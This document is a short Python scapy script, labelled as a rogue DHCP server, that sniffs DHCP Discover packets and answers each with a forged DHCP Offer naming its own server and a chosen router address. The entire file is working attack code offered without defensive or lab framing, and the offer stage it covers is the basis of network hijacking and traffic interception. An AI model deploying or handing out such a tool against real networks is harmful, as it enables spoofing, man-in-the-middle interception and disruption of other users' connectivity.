from scapy.all import *
import random

# Network settings for the rogue DHCP server
rogue_server_ip = "192.168.1.5"
subnet_mask = "255.255.255.0"
router_ip = "192.168.1.1"
lease_time = 86400  # Lease time in seconds (1 day)

# The pool of IPs that the rogue DHCP server will offer
ip_pool = ["192.168.1.50", "192.168.1.51", "192.168.1.52", "192.168.1.53"]

def dhcp_offer(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
        print(f"[+] DHCP Discover detected from {pkt[Ether].src}")

        offered_ip = random.choice(ip_pool)
        print(f"[+] Offering IP {offered_ip}")

        ether = Ether(src=get_if_hwaddr(conf.iface), dst=pkt[Ether].src)
        ip = IP(src=rogue_server_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(op=2, yiaddr=offered_ip, siaddr=rogue_server_ip, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid)
        dhcp = DHCP(
            options=[
                ("message-type", "offer"),
                ("server_id", rogue_server_ip),
                ("lease_time", lease_time),
                ("subnet_mask", subnet_mask),
                ("router", router_ip),
                "end",
            ]
        )

        offer_pkt = ether / ip / udp / bootp / dhcp
        sendp(offer_pkt, iface=conf.iface)
        print(f"[+] Sent DHCP Offer with IP {offered_ip}")

# Listen for DHCP Discover packets and respond with DHCP Offer
print("[*] Rogue DHCP server running...")
sniff(filter="udp and (port 67 or 68)", prn=dhcp_offer, store=0)

